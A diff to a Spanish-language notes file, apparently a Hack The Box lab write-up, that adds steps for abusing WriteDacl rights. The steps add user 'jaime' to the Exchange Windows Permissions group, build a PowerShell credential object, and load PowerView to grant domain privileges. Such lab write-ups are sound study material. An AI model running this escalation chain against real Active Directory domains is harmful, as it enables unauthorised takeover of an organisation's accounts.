@@ -186,11 +186,19 @@ Añadimos al usuario al grupo
 net group "Exchange Windows Permissions" jaime /add
 ```
 
-Una vez con el usuario añadido al grupo seguiremos los pasos que nos muestran [[BLOODHOUND]] para abusar de `Write Dacl`
+Una vez con el usuario añadido al grupo seguiremos los pasos que nos muestran [[BLOODHOUND]] para abusar de `Write Dacl` seteando la contraseña con `SecureString`
 ```shell
 $SecPassword = ConvertTo-SecureString 'jaime123!' -AsPlainText -Force
 ```
 
+Por otro lado vamos a definir una credencial ya que la contraseña esta en formato `SecureString`
+```shell
+$Cred = New-Object System.Management.Automation.PSCredential('htb.local\jaime', $SecPassword)
+```
+
+Con el objeto creado podemos manipularlo con `Add-DomainObjectAcl` para darle el usuario con las credenciales y asignarle privilegios 
+
+Para poder hacerlo tenemos que cargar el modulo de `PowerViex.ps1` 
 
 
 
